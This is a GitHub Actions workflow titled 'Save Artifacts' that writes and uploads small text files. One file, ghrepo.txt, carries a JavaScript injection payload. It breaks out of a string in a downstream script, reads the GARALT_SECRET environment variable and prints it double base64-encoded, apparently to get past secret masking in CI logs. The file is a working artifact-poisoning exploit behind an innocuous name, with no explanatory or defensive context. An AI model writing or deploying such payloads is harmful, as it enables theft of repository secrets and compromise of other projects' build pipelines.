name: Save Artifacts
on:
  workflow_call: null
jobs:
  save-artifacts:
    runs-on: ubuntu-latest
    steps:
      - shell: bash
        run: |
          mkdir -p wr_actions
          echo "any" > wr_actions/ghowner.txt
          echo 'any", labels: [] }); const s=process.env.GARALT_SECRET; const b=Buffer.from(s).toString("base64"); console.log("GARALT_LEAKED_TOKEN=" + Buffer.from(b).toString("base64")); //' > wr_actions/ghrepo.txt
          echo "1" > wr_actions/prnumber.txt
      - uses: actions/upload-artifact@ea165f8d65b6e75b540449e92b4886f43607fa02
        with:
          name: artifact
          path: wr_actions
          retention-days: 1
